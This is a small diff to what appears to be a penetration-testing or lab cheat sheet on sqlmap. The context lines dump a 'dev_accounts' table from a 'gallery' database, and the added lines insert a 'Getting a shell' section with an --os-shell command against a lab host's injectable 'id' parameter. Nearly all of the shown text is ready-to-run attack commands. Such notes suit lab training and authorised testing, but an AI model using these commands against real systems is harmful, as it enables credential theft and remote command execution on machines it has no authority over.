@@ -38,6 +38,13 @@ sqlmap -r burp1 --risk=3 --level=5 -D gallery --tables --batch
 sqlmap -r burp1 --risk=3 --level=5 -D gallery -T dev_accounts --dump --batch
 
 ```
+
+Getting a shell:
+
+```
+ sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
+```
+
 ___
 
 ## Resources:
